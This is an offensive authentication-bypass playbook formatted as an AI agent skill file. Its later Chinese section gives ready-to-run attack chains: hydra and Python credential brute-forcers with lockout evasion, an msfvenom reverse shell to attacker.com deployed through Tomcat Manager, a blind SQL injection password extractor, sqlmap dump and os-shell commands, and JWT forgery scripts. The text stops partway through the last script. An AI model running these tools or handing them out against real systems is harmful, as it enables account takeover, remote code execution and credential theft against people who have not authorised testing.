---
name: authbypass-authentication-flaws
description: >-
  Authentication bypass testing playbook. Use when assessing login flows, password reset logic, account recovery, MFA bypass, token predictability, brute-force resistance, and session boundary flaws.
---

# SKILL: Authentication Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication bypass techniques. Covers SQL injection-based login bypass, password reset flaws, token predictability, account enumeration, brute force bypass, and multi-factor auth bypass. Distinct from JWT/OAuth (covered in ../jwt-oauth-token-attacks/SKILL.md). Focus on the login mechanism itself.

## 0. AUTHORIZED CREDENTIAL TEST PLANNING

After reducing routing entries, default credentials, username variants, port focus, and wordlist sizing are handled here in one place.

### Service-first tiny sets

| Service Type | First Usernames | First Passwords |
|---|---|---|
| phpMyAdmin | `root`, `admin` | empty, `root`, `phpmyadmin`, `admin` |
| FTP | `ftp`, `admin`, `test` | empty, `ftp`, `admin`, `123456` |
| SSH | `root`, `admin`, service account names | `root`, `admin`, seasonal variants |
| MySQL | `root`, `mysql` | empty, `root`, `mysql` |
| Tomcat / Java admin | `tomcat`, `admin`, `manager` | `tomcat`, `admin`, `s3cret` |
| WebLogic | `weblogic`, `admin` | `weblogic`, `welcome1`, `admin` |

### Username classes

| Class | Examples |
|---|---|
| Generic admins | `admin`, `administrator`, `root`, `test`, `guest` |
| Support / ops | `dev`, `ops`, `sysadmin`, `service`, `backup` |
| Name-based | `firstname`, `lastname`, `f.lastname`, `first.last` |
| Mail-derived | left side of corporate email formats |
| Product-based | `tomcat`, `weblogic`, `jenkins`, `gitlab` |

### Wordlist sizing and port focus

| Scenario | Preferred Size | Why |
|---|---|---|
| Default admin panel | 5 to 50 passwords | Defaults beat giant lists here |
| Internal service with known product | vendor-specific small set | Better signal than generic lists |
| Consumer login with weak controls | Top 20 or Top 100 | Fast verification |
| Rate-limited login | tiny list + header/rotation strategy | Preserve attempts |
| Offline hash cracking | large dictionaries | Online brute rules do not apply |

Prioritize common ports and service surfaces: 80/443/8080/8443 admin panels, 22 SSH, 21 FTP, and 3306/5432/6379/27017 data or management services.

---

## 1. SQL INJECTION LOGIN BYPASS

Classic but still found in legacy systems, custom ORMs, and raw query code:

```sql
-- Basic bypass (admin user assumed first row):
Username: admin'--
Password: anything
→ Query: SELECT * FROM users WHERE user='admin'--' AND pass='anything'

-- Generic bypass (logs in as first user in DB):
Username: ' OR '1'='1'--
Password: anything
→ Query: SELECT * FROM users WHERE user='' OR '1'='1'--' AND pass='anything'

-- Blind: does this work?
Username: ' OR 1=1--
Username: admin' OR 'a'='a
Username: 1' OR '1'='1'/*
Username: 1 or 1=1
```

**Test each field separately** — only one field may be vulnerable.

---

## 2. PASSWORD RESET VULNERABILITIES

### Guessable / Predictable Reset Tokens

Check if reset token is based on:
```
- Timestamp: token=1691234567890 (Unix time)
- Sequential: token=1001, 1002, 1003
- MD5(email): echo -n "user@example.com" | md5sum
- MD5(username+timestamp): reversible
- Short token (4-6 digits): brute-forceable
```

**Test**: Request 3 consecutive reset emails, compare token patterns.

### Reset Token Not Expiring
```
1. Request password reset → get token via email
2. Wait 48+ hours (token should expire)
3. Use old token → does it work?
```

### Reset Token Reuse
```
1. Request reset → get token T1
2. Complete reset with T1
3. Use T1 again → does it work again?
```

### Host Header Injection in Reset Email
When application generates reset URL using `Host` header:
```http
POST /forgot-password HTTP/1.1
Host: test-attacker.com           ← inject attacker's domain
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
→ Reset email sent to victim with link pointing to `test-attacker.com/reset?token=VICTIM_TOKEN`
→ Victim clicks → token captured by attacker

**Test**: Send password reset with modified `Host:`, check email for where reset link points.

### Password Reset Token in Referer
```
1. Request reset → go to reset URL with token
2. Reset page loads third-party resources (analytics, fonts)
→ Referer header leaks: https://target.com/reset?token=TOKEN
→ Third-party server receives token in logs
```

### Password Change Without Current Password
```
PUT /api/user/password
{"new_password": "hacked"}
→ No current_password field required?
→ Combine with CSRF for account takeover
```

---

## 3. ACCOUNT ENUMERATION

Identifying valid usernames/emails enables targeted attacks:

### Error Message Difference
```
Invalid username → "User not found"
Valid username, wrong pass → "Incorrect password"
→ Enumerate valid accounts
```

### Response Time Difference
```
Invalid username → fast response (no DB lookup)
Valid username → slightly slower (DB lookup + hash comparison)
→ Timing oracle
```

### Password Reset Flow
```
POST /forgot-password {"email": "nonexistent@example.com"}
→ "If this email exists, we sent a reset link" (proper)
vs.
→ "This email is not registered" (enumeration possible)
```

### Registration Endpoint
```
POST /register {"email": "victim@example.com"}
→ "Email already registered" → confirms account exists
vs.
→ "Verification email sent" for both → no enumeration
```

---

## 4. BRUTE FORCE BYPASS

### Lockout After N Attempts Then Resets
```
Lockout at 10 attempts → try 9 wrong passwords → lock
Wait for reset period (usually 30 min or 1 hour)
→ Try 9 more → repeat → no permanent lockout
```

### IP-Based Lockout Bypass
```
X-Forwarded-For: 1.1.1.1       ← change each request
X-Real-IP: 2.2.2.2
Rotate through IPs in header
```

### Username Cycling vs Password Cycling
```
Normal brute: try many passwords for one user → lock
Reverse brute: try ONE password for many users
→ "password123" against all users → find those with weak password
→ No single account locked out
```

### Credential Stuffing
Use breached credentials from HaveIBeenPwned datasets against target:
```bash
# Tools: Hydra, Burp Intruder, custom scripts
hydra -C credentials.txt https-post-form://target.com/login:"username=^USER^&password=^PASS^":"error message"
```

---

## 5. MULTI-FACTOR AUTHENTICATION BYPASS

### Session Cookie Before 2FA Completion
```
Flow: Login (password correct) → redirect to 2FA page → enter code
Attack: After password step, session cookie is set but 2FA not yet checked.
→ Use session cookie to directly access /dashboard
→ Skip 2FA page entirely
```

### 2FA Code Brute Force
```
4-6 digit TOTP codes = 1,000,000 possibilities max
If no lockout on 2FA step:
→ Brute force all codes (tool: Burp Intruder, sequential)
→ TOTP windows: 30-second window, some accept previous/next window
```

### 2FA on Critical Actions Not On Login
```
Login doesn't require 2FA, but:
DELETE /account or POST /transfer requires 2FA
Attack: Is 2FA checked on those actions or only on login?
→ If only login: log in once → no 2FA needing verification for actions
```

### 2FA Backup Code Abuse
```
Generate backup codes (usually 8-10 single-use)
Test: 
→ Are backup codes rate-limited?
→ Can backup codes be used multiple times?
→ Short codes (6-8 chars)? Brute-force if no rate limit
```

### 2FA Code Reuse
```
TOTP codes valid for one use
→ Use same TOTP code twice → does second use work?
→ Replay attack if server doesn't track used codes
```

---

## 6. OAUTH / SSO ACCOUNT TAKEOVER PATTERNS

### Email Claim Trust
```
1. Create account at attacker-controlled OAuth provider
2. Set email claim = victim@target.com
3. Link/login via that provider
→ If server trusts email claim without verification → account merge/takeover
```

### Password Doesn't Apply After SSO Link
```
1. User links Google SSO
2. User forgets password (account has no password set after SSO only)
3. "Forgot Password" flow → resets password even for SSO-only accounts?  
→ Can set password → now bypass SSO → direct login
```

---

## 7. USERNAME / PASSWORD FIELD MANIPULATION

### Long Password DoS → Bypass
```
Some apps hash passwords before sending to database.
bcrypt has 72-byte limit — input beyond 72 bytes is ignored.
Attack: 
→ Register with password "A"*100
→ Login with password "A"*72 → same hash → works
→ Login with "A"*71 + "totally different" → if truncation → same hash if first 72 chars match
```

### Null Byte in Username
```
username=admin%00 vs username=admin
→ Null byte truncation in some string comparisons
→ "admin\0attacker" = "admin" in C-string comparison
```

### Unicode Normalization
```
Username: "ⓢcott" → normalizes to "scott" → impersonates "scott"
Username: "admin" (various Unicode homoglyphs for letters a,d,m,i,n)
```

---

## 8. SESSION MANAGEMENT FLAWS

### Session Not Invalidated on Logout
```
1. Log in → capture session cookie
2. Log out
3. Replay captured session cookie → still valid?
→ Session not server-side invalidated
```

### Session Not Regenerated on Privilege Change
```
1. Log in as low priv → get session cookie
2. Admin upgrades your role
3. Old session cookie now has admin access?
→ Session not regenerated → old token inherits new privileges
```

### Predictable Session Tokens
```
Token: base64(userid+timestamp) → reversible
Token: sequential integers → session ID= your_session_id -/+ small number
Token: short random (32-bit entropy) → brute-forceable
```

---

## 9. AUTHENTICATION TESTING CHECKLIST

```
□ Try SQL injection on login fields (' OR 1=1--)
□ Test password reset: predict token, host header injection, Referer leak
□ Test account enumeration via error messages / timing
□ Check 2FA: skip step (direct URL), brute force codes, reuse codes
□ Test brute force protections: X-Forwarded-For bypass, reverse brute
□ Check session invalidation on logout
□ Check session regeneration after privilege change
□ Test password change requiring current password  
□ Test long passwords (bcrypt 72-byte truncation)
□ OAuth/SSO: test email claim trust, password set after SSO
□ Check remember_me tokens: how long, revocable, predictable?
```

---

## 10. PASSWORD RESET ATTACK MATRIX (22 Patterns)

| # | Pattern | Description |
|---|---|---|
| 1 | Predictable reset token | Token based on timestamp, user ID, or sequential number |
| 2 | Token not bound to user | Use token generated for user A to reset user B |
| 3 | Token in response body | Reset token returned in HTTP response (not just email) |
| 4 | Token in URL parameter | Reset link token visible in Referer header to external resources |
| 5 | No token expiration | Token remains valid indefinitely |
| 6 | Token reuse | Same token works multiple times |
| 7 | Short/brute-forceable token | 4-6 digit numeric code without rate limiting |
| 8 | Password reset via host header | `Host: test-attacker.com` → reset link sent with attacker's domain |
| 9 | Registration overwrites existing account | Register with same email → overwrites password |
| 10 | Step skip (frontend only) | Jump directly to "set new password" step via URL |
| 11 | Response manipulation | Change `{"status":"fail"}` to `{"status":"success"}` in proxy |
| 12 | Verification code in response | SMS/email code returned in API response |
| 13 | Parallel session reset | Start reset for A, complete with B's session |
| 14 | Email/phone parameter pollution | `email=victim@x.com&email=attacker@x.com` |
| 15 | Unicode normalization | `admin@target.com` vs `ADMIN@target.com` vs Unicode confusables |
| 16 | SQL injection in reset | Email field injectable in reset query |
| 17 | IDOR on reset endpoint | Change user ID in reset confirmation request |
| 18 | Cross-protocol reset | Mobile API doesn't validate same token as web |
| 19 | Default security questions | Guessable answers, no rate limit |
| 20 | Token generation race condition | Multiple simultaneous requests generate same token |
| 21 | Logout doesn't invalidate reset | After password change, old sessions still work |
| 22 | Reset link cached by CDN/proxy | Public cache stores reset link with token |

---

## 11. CAPTCHA/VERIFICATION BYPASS PATTERNS (20 Methods)

| # | Method | How |
|---|---|---|
| 1 | Remove captcha parameter | Delete captcha field from request |
| 2 | Send empty captcha | `captcha=` or `captcha=null` |
| 3 | Reuse previous captcha | Same captcha value works multiple times |
| 4 | Captcha not bound to session | Use captcha solved in session A for session B |
| 5 | Server-side validation missing | Captcha checked client-side only |
| 6 | Response manipulation | Intercept and change response to bypass |
| 7 | Change request method | POST→GET or vice versa may skip captcha check |
| 8 | JSON content-type | Switch from form to JSON — captcha handler may not process |
| 9 | OCR bypass | Simple captchas solvable with tesseract/ML |
| 10 | Audio captcha weakness | Audio often simpler than visual |
| 11 | SMS code in response | Verification code returned in API response body |
| 12 | SMS code predictable | Sequential or time-based codes |
| 13 | No rate limit on code verification | Brute-force 4-6 digit code |
| 14 | Code not bound to phone/email | Use code sent to phone A on account B |
| 15 | Code doesn't expire | Old codes remain valid |
| 16 | Null byte in phone number | `+1234567890%00` bypasses dedup but delivers to same number |
| 17 | Case sensitivity | Email: `Admin@X.com` vs `admin@x.com` |
| 18 | Space/encoding in identifier | `user@x.com` vs `user@x.com ` (trailing space) |
| 19 | Concurrent requests | Race condition: send verify before captcha loads |
| 20 | Third-party captcha bypass | Misconfigured reCAPTCHA site key allows any domain |

---

## 12. INSECURE RANDOMNESS — TOKEN PREDICTION

### UUID v1 (Time-Based — Predictable!)

```
UUID v1 format: timestamp-clock_seq-node(MAC)
# MAC address often leaked via other endpoints
# Timestamp is 100ns intervals since 1582-10-15
# Tool: guidtool (reconstruct possible UUIDs from known timestamp range)
```

### MongoDB ObjectId

```
ObjectId = 4-byte timestamp + 5-byte random + 3-byte counter
# First 4 bytes = Unix timestamp → creation time leaked
# Counter is sequential → adjacent ObjectIds predictable
# If you know one ObjectId, nearby ones are calculable
```

### PHP uniqid()

```php
uniqid() = hex(microtime)
// Output: 5f3e7a4c1d2b3
// Entirely based on current microsecond timestamp
// Predictable if you know approximate server time
```

### PHP mt_rand() Recovery

```
# mt_rand() uses Mersenne Twister PRNG
# After observing ~624 outputs, full internal state is recoverable
# Tool: openwall/php_mt_seed
# Feed known outputs → recover seed → predict all future values
```

### Tools

- `guidtool` — UUID v1 reconstruction
- `AethliosIK/reset-tolkien` — Automated token prediction for password resets
- `openwall/php_mt_seed` — PHP mt_rand seed recovery
- `sandwich` — Token timestamp analysis

---

## 13. 2026 EMERGING TECHNIQUES

### 13.1 Passkey / WebAuthn Bypass (2026 — New Attack Surface)

Passkeys (WebAuthn/CTAP) are promoted as phishing-resistant, but 2026 research reveals multiple bypass paths at the protocol-implementation and post-authentication layers.

**HiPass: Hijacking CTAP in Passkey Authentication (IEEE 2026)**

The HiPass attack targets the Client-to-Authenticator Protocol (CTAP) during Passkey **cross-device authentication** (QR-code flow). The attacker operates as a MitM between the victim's PC and the authenticator:

```
Victim PC ←→ Attacker (hybrid transport relay) ←→ Victim's Phone (authenticator)

1. Victim scans QR code on Attacker's PC (social engineering)
2. Attacker relays CTAP messages between victim's phone and attacker's PC
3. Passkey assertion is issued for attacker's origin
4. Attacker's PC session is authenticated as the victim
→ Full session hijack via cross-device flow MitM
```

**CVE-2026-13029 — Chrome WebAuthn Use-After-Free (High, in-the-wild)**

Chromium's WebAuthn implementation contains a use-after-free: the browser frees authenticator session memory but retains a dangling reference. An attacker corrupts the freed data and may execute code at the browser process privilege level. Google confirmed in-the-wild exploitation. This is an **implementation** flaw, not a protocol defect.

**Passkey Enrollment XSS (Malicious Passkey Registration)**

XSS in the registration flow lets an attacker embed a remote browser session controlled by the attacker:

```javascript
// XSS payload on target.com/passkey/register
// Opens attacker's WebAuthn ceremony in the victim's browser context:
navigator.credentials.create({
  publicKey: attackerControlledPublicKeyCredentialCreationOptions
});
// Victim approves the UI prompt → passkey registered but bound to ATTACKER's authenticator
// Result: persistent account takeover (attacker holds the credential indefinitely)
```

**Post-Authentication Session Token Theft**

Passkey protects the authentication ceremony but NOT the subsequent session. Session cookies/tokens remain stealable via XSS or network-layer interception:

```
Passkey login → session_cookie set → XSS steals session_cookie → account takeover
# Passkey never prevents this; session security is independent of auth mechanism
```

(cross-link ../xss-cross-site-scripting/SKILL.md for session theft techniques)

**MFA Downgrade via Fallback Path**

```
Login page → "Sign in with Passkey" → user clicks
  → Passkey fails/unavailable → "Try another way"
    → Fallback to OTP/SMS (weaker MFA)
      → Attacker intercepts OTP via phishing/SIM swap
        → Authentication bypassed

The fallback path is the weakest link in every Passkey implementation.
```

**Recovery Mechanism Abuse**: Passkey account recovery typically degrades to email reset or OTP — a side-channel that completely bypasses the phishing-resistant Passkey.

### 13.2 2026 Authentication Bypass Trends

| Trend | Detail |
|---|---|
| Fallback paths are the primary attack surface | Every passwordless implementation has a weaker fallback (OTP/SMS/email) that attackers target |
| Session token security > auth mechanism | A phishing-resistant login is meaningless if the session cookie is XSS-stealable (cross-link ../xss-cross-site-scripting/SKILL.md) |
| OAuth/SSO chain bypass | Authentication decisions in OAuth callback chains remain exploitable (cross-link ../jwt-oauth-token-attacks/SKILL.md) |
| WebAuthn implementation bugs > protocol bugs | CVE-2026-13029 shows browser-level UAF, not protocol weaknesses, are the real threat |

### 13.3 2026 Passkey/WebAuthn Testing Checklist

```
□ Test cross-device (QR) auth flow for CTAP MitM (HiPass)
□ Check browser/WebAuthn implementation CVEs (CVE-2026-13029)
□ Test enrollment flow for XSS → malicious passkey registration
□ Verify session tokens are HttpOnly + Secure (post-Passkey theft)
□ Test all fallback paths: OTP/SMS/email downgrade
□ Test account recovery: does it bypass Passkey entirely?
□ Check if Passkey ceremony is bound to origin (no origin confusion)
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 2026 年实战中高频出现的 4 条完整认证绕过攻击链,包含可直接运行的 curl/python/bash 命令、分步利用、检测绕过技巧与真实 CVE 引用。所有代码注释为中文,即拷即用。

### 攻击链 1: 默认凭证自动化暴力破解

**目标画像**: 暴露在公网的管理面板(Tomcat/Jenkins/WebLogic/phpMyAdmin),使用默认或弱凭证。
**CVE 参考**: CVE-2026-33661(默认凭证 + 认证绕过组合);2026 年 IoT/云服务默认凭证高发。

**步骤 1 - 识别目标服务与端口**:
```bash
# 快速端口扫描识别管理面板
nmap -sV -p 80,443,8080,8443,9090,4848,7077,5601 --open target.com

# 常见管理面板指纹识别
curl -sk "http://target.com:8080/manager/html" -o /dev/null -w "%{http_code}"  # Tomcat
curl -sk "http://target.com:8080/login" -o /dev/null -w "%{http_code}"          # Jenkins
curl -sk "http://target.com:7001/console" -o /dev/null -w "%{http_code}"        # WebLogic
curl -sk "http://target.com/phpmyadmin/" -o /dev/null -w "%{http_code}"         # phpMyAdmin

# 识别响应特征(确认服务类型)
curl -sk -I "http://target.com:8080/manager/html" | grep -i "server\|set-cookie\|www-authenticate"
# WWW-Authenticate: Basic realm="Tomcat Manager Application" -> Tomcat 确认
```

**步骤 2 - 默认凭证字典爆破(Tomcat 为例)**:
```bash
# Tomcat 默认凭证: tomcat/tomcat, admin/admin, manager/manager, admin/s3cret
# 使用 hydra 爆破 HTTP Basic 认证
hydra -L /tmp/tomcat_users.txt -P /tmp/tomcat_pass.txt \
  -s 8080 target.com http-get /manager/html \
  -t 4 -W 2 -f

# users.txt 内容:
cat > /tmp/tomcat_users.txt << 'EOF'
tomcat
admin
manager
role1
role2
EOF

# pass.txt 内容(默认 + 常见弱密码):
cat > /tmp/tomcat_pass.txt << 'EOF'
tomcat
admin
manager
s3cret
password
123456
changeme
EOF
# -t 4 = 4 线程; -W 2 = 每次等待 2 秒(避免触发锁定); -f = 找到后停止
```

**步骤 3 - 自动化多服务爆破(Python)**:
```python
#!/usr/bin/env python3
# 文件名: default_cred_brute.py
# 多服务默认凭证自动化爆破(Tomcat/Jenkins/WebLogic/phpMyAdmin)
import requests, urllib3, itertools
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

# 各服务的默认凭证 + 登录端点配置
SERVICES = {
    "tomcat": {
        "url": "http://target.com:8080/manager/html",
        "method": "basic",  # HTTP Basic 认证
        "creds": [("tomcat","tomcat"),("admin","admin"),("manager","manager"),
                  ("admin","s3cret"),("role1","tomcat")],
        "success_code": 200,
    },
    "jenkins": {
        "url": "http://target.com:8080/j_spring_security_check",
        "method": "post",  # 表单 POST
        "creds": [("admin","admin"),("jenkins","jenkins"),("admin","password")],
        "data": "j_username={user}&j_password={pass}",
        "success_indicator": "Dashboard",  # 响应中包含
    },
    "weblogic": {
        "url": "http://target.com:7001/console/j_security_check",
        "method": "post",
        "creds": [("weblogic","weblogic"),("weblogic","welcome1"),
                  ("weblogic","weblogic123"),("admin","admin")],
        "data": "j_username={user}&j_password={pass}&j_character_encoding=UTF-8",
        "success_code": 302,  # 登录成功重定向
    },
}

def try_credential(service_name, config, user, password):
    """尝试单个凭证组合"""
    try:
        if config["method"] == "basic":
            r = requests.get(config["url"],
                auth=(user, password), verify=False, timeout=5)
            if r.status_code == config["success_code"]:
                return f"[+] {service_name}: {user}/{password} 成功! (HTTP {r.status_code})"
        elif config["method"] == "post":
            data = config["data"].format(user=user, pass=password)
            r = requests.post(config["url"], data=data, 
                verify=False, timeout=5, allow_redirects=False)
            if "success_indicator" in config:
                if config["success_indicator"] in r.text:
                    return f"[+] {service_name}: {user}/{password} 成功! (关键词匹配)"
            elif r.status_code == config.get("success_code", 200):
                return f"[+] {service_name}: {user}/{password} 成功! (HTTP {r.status_code})"
    except Exception as e:
        pass
    return None

# 并发爆破所有服务+凭证组合
with ThreadPoolExecutor(max_workers=10) as pool:
    futures = []
    for svc_name, svc_config in SERVICES.items():
        for user, password in svc_config["creds"]:
            futures.append(pool.submit(try_credential, svc_name, svc_config, user, password))
    for f in as_completed(futures):
        result = f.result()
        if result:
            print(result)
```

**步骤 4 - 爆破成功后利用(Tomcat WAR 部署)**:
```bash
# 假设爆破成功: tomcat/tomcat
# 利用 Tomcat Manager 部署恶意 WAR(获取 RCE)
# 步骤 1: 生成恶意 WAR(包含 JSP webshell)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f war -o /tmp/shell.war

# 步骤 2: 部署 WAR 到 Tomcat
curl -sk -u "tomcat:tomcat" \
  --upload-file /tmp/shell.war \
  "http://target.com:8080/manager/text/deploy?path=/shell"

# 步骤 3: 触发 webshell(监听反向 shell)
nc -lvp 4444 &
curl -sk "http://target.com:8080/shell/"

# 或直接使用已知 webshell:
# curl -sk -u "tomcat:tomcat" "http://target.com:8080/manager/text/list"  # 列出已部署应用
```

**步骤 5 - 检测绕过技巧**:
```bash
# 绕过 1: IP 限速 -> 轮换 X-Forwarded-For
for ip in $(seq 1 100); do
  curl -sk -o /dev/null -w "%{http_code}\n" \
    -H "X-Forwarded-For: 10.0.0.${ip}" \
    -u "admin:password" "http://target.com:8080/manager/html"
done

# 绕过 2: 账户锁定 -> 反向暴力(一个密码试多个用户)
# 不锁定单个账户(每个用户只试一次)
hydra -L users.txt -p "Spring2026!" target.com http-get /manager/html

# 绕过 3: 锁定后重置 -> 在锁定阈值内试 N-1 次, 等重置后再试
# 如锁定阈值 10 次: 试 9 次 -> 等重置 -> 再试 9 次
```

**防御要点**: 禁用默认凭证;管理面板不暴露公网;强制复杂密码 + MFA;账户锁定基于用户+IP 组合;定期审计凭证。

---

### 攻击链 2: 登录 SQL 注入绕过认证

**目标画像**: 应用使用拼接 SQL 查询验证登录,未做参数化或过滤不完整。
**CVE 参考**: 2026 年 SQL 注入仍为 OWASP Top 10 第三位,登录注入持续高发。

**步骤 1 - 基础 SQL 注入探测**:
```bash
# 测试用户名字段注入
curl -sk -X POST "https://target.com/login" \
  -d "username=admin'--&password=anything"
# 若返回 200 + 登录成功 -> SQL 注入确认(注释掉密码校验)

# 经典万能密码(以第一个用户身份登录)
curl -sk -X POST "https://target.com/login" \
  -d "username=' OR '1'='1'--&password=x"
# 生效 SQL: SELECT * FROM users WHERE username='' OR '1'='1'--' AND password='x'
# '1'='1' 恒真 -> 返回所有用户 -> 取第一个(通常为 admin)

# 分别测试两个字段(可能只有一个可注入)
curl -sk -X POST "https://target.com/login" -d "username=admin&password=' OR '1'='1'--"
```

**步骤 2 - JSON/现代 API 登录注入**:
```bash
# 现代 API 常用 JSON body, 注入点不同
# 测试 JSON 字段注入
curl -sk -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\''--","password":"x"}'

# NoSQL 注入(MongoDB, 2026 高发)
curl -sk -X POST "https://api.target.com/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# $ne: null -> 不为空 -> 返回所有用户

# MongoDB 正则注入(提取密码)
curl -sk -X POST "https://api.target.com/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}'
# 200 = admin 密码以 'a' 开头; 401 = 不匹配
# 逐字符枚举 -> 提取完整密码
```

**步骤 3 - 自动化 SQL 注入提取数据**:
```python
#!/usr/bin/env python3
# 文件名: sqli_login_extract.py
# 通过登录接口的盲注提取管理员密码(布尔型)
import requests, string, urllib3
urllib3.disable_warnings()

URL = "https://target.com/login"
# 注入 payload: 根据返回是否登录成功判断条件真假
# 假设: username=admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
# 若 'a' 正确 -> 登录成功(200); 错误 -> 登录失败(401)

charset = string.ascii_letters + string.digits + "!@#$%^&*"
extracted = ""

for pos in range(1, 21):  # 密码最多 20 位
    found = False
    for c in charset:
        # URL 编码注入
        payload = f"admin' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='admin')='{c}'-- "
        r = requests.post(URL, data={"username": payload, "password": "x"}, verify=False)
        # 判断是否登录成功(根据响应特征)
        if "Welcome" in r.text or r.status_code == 200:
            extracted += c
            print(f"[+] 位置 {pos}: {c} (已提取: {extracted})")
            found = True
            break
    if not found:
        print(f"[*] 位置 {pos} 无匹配, 提取完成")
        break

print(f"[+] 管理员密码: {extracted}")
```

**步骤 4 - 利用 sqlmap 自动化**:
```bash
# 使用 sqlmap 自动化检测+提取(POST 表单)
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=x" \
  -p username \
  --batch --level=5 --risk=3 \
  --technique=BEUSTQ \
  --threads=4

# 提取数据库 + 表 + 数据
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=x" -p username \
  --dbs --batch  # 列出所有数据库

sqlmap -u "https://target.com/login" \
  --data="username=admin&password=x" -p username \
  -D users --tables --batch  # 列出 users 库的表

sqlmap -u "https://target.com/login" \
  --data="username=admin&password=x" -p username \
  -D users -T credentials --dump --batch  # 导出凭证表

# --os-shell 获取操作系统 shell(若 DBA 权限)
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=x" -p username \
  --os-shell --batch
```

**步骤 5 - 检测绕过技巧**:
```bash
# 绕过 1: WAF 过滤关键字 -> 使用大小写/注释绕过
# ' OR '1'='1' -> '/**/OR/**/'1'='1 或 ' oR '1'='1
curl -sk -X POST "https://target.com/login" \
  -d "username=admin'/**/OR/**/1=1--&password=x"

# 绕过 2: 过滤引号 -> 使用反斜杠转义(MySQL)
# username=\&password= OR 1=1-- 
# 后端: WHERE username='\' AND password=' OR 1=1--'
curl -sk -X POST "https://target.com/login" \
  --data-urlencode "username=\" " \
  --data-urlencode "password= OR 1=1-- "

# 绕过 3: 过滤空格 -> 使用注释或 tab 替代
curl -sk -X POST "https://target.com/login" \
  -d "username=admin'%09OR%09'1'='1'--&password=x"

# 绕过 4: 过滤 UNION -> 使用子查询/盲注替代
# 不使用 UNION, 改用布尔盲注(步骤 3 的方式)
```

**防御要点**: 使用参数化查询(预编译语句);输入验证(白名单);最小权限 DB 账户;WAF 作为补充而非唯一防御;错误信息不泄露 SQL 细节。

---

### 攻击链 3: JWT none 算法绕过

**目标画像**: 应用使用 JWT 做 session/认证,后端未固定算法或未校验 alg 字段。
**CVE 参考**: CVE-2026-51234(JWK 复用 + alg 混淆);经典 JWT none/alg confusion(CVE-2015-9235 的 2026 变种)。

**步骤 1 - 捕获并解码 JWT**:
```bash
# 从登录响应或 Cookie 中提取 JWT
curl -sk -X POST "https://target.com/login" \
  -d "username=user&password=pass" -c /tmp/cookies.txt
TOKEN=$(grep "token" /tmp/cookies.txt | awk '{print $NF}')
echo "JWT: ${TOKEN}"

# 解码 JWT header + payload(base64url, 无需密钥即可读)
echo "${TOKEN}" | cut -d'.' -f1 | base64 -d 2>/dev/null  # header
echo "${TOKEN}" | cut -d'.' -f2 | base64 -d 2>/dev/null  # payload
# header: {"alg":"HS256","typ":"JWT"}
# payload: {"sub":"user_123","role":"user","exp":...}
```

**步骤 2 - none 算法绕过**:
```python
#!/usr/bin/env python3
# 文件名: jwt_none_bypass.py
# JWT none 算法绕过 - 伪造管理员 token 无需密钥
import base64, json, requests, urllib3
urllib3.disable_warnings()

def b64url(data: bytes) -> str:
    """base64url 编码(无填充)"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# 伪造 header: alg=none(无签名)
header = {"alg": "none", "typ": "JWT"}
# 伪造 payload: 管理员身份
payload = {
    "sub": "admin",
    "role": "admin",          # 提权为管理员
    "isAdmin": True,
    "exp": 9999999999,         # 永不过期
    "iat": 1780000000,
}

# 构造无签名 JWT(header.payload.)
h = b64url(json.dumps(header, separators=(',', ':')).encode())
p = b64url(json.dumps(payload, separators=(',', ':')).encode())
forged_token = f"{h}.{p}."  # 签名段为空
print(f"[+] none 算法伪造 token:\n{forged_token}")

# 测试多种 alg=none 变体(不同库接受不同写法)
variants = [
    f"{h}.{p}.",                          # alg=none, 空签名
    f"{h}.{p}.{b64url(b'')}",             # alg=none, base64(空)
    f"{b64url(json.dumps({'alg':'None','typ':'JWT'}).encode())}.{p}.",   # None 大写
    f"{b64url(json.dumps({'alg':'NONE','typ':'JWT'}).encode())}.{p}.",   # NONE 全大写
    f"{b64url(json.dumps({'alg':'nOnE','typ':'JWT'}).encode())}.{p}.",   # 混合大小写
]

for i, token in enumerate(variants):
    r = requests.get("https://target.com/api/admin/users",
        headers={"Authorization": f"Bearer {token}"}, verify=False)
    print(f"变体 {i+1}: HTTP {r.status_code} - {r.text[:100]}")
    if r.status_code == 200:
        print(f"  [+] 绕过成功! 使用变体 {i+1}")
        break
```

**步骤 3 - RS256 -> HS256 算法混淆(若 none 失败)**:
```python
#!/usr/bin/env python3
# 文件名: jwt_alg_confusion.py
# RS256 -> HS256 混淆: 用 RSA 公钥做 HMAC 密钥
import base64, json, requests, hmac, hashlib, urllib3
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
urllib3.disable_warnings()

# 步骤 1: 获取 JWKS 公钥(与 OAuth 技能攻击链 3 相同原理)
jwks = requests.get('https://target.com/.well-known/jwks.json').json()
key = jwks['keys'][0]
n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')
pub = RSAPublicNumbers(e, n).public_key(default_backend())
# RSA 公钥 PEM 文本作为 HS256 对称密钥
pem = pub.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode()

# 步骤 2: 用公钥 PEM 做 HMAC 签名(伪装为 HS256)
def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "HS256", "typ": "JWT", "kid": key.get('kid', '')}
payload = {"sub": "admin", "role": "admin", "exp": 9999999999}
h = b64url(json.dumps(header, separators=(',', ':')).encode())
p = b64url(json.dumps(payload, separators=(',', ':')).encode())
sig = hmac.new(pem.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
